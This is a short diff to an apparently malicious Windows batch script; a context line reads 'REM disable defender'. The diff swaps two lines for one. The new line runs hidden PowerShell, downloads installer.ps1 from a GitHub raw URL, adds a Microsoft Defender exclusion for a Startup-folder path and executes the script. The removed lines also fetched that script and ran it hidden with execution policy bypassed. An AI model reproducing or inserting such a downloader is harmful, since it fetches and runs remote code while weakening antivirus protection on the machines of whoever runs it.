@@ -25,5 +25,4 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 REM disable defender
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/MuridFanny/0oiw91383u203218y3/tikus/installer.ps1 -Outfile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/MuridFanny/0oiw91383u203218y3/tikus/installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1"; ./installer.ps1 
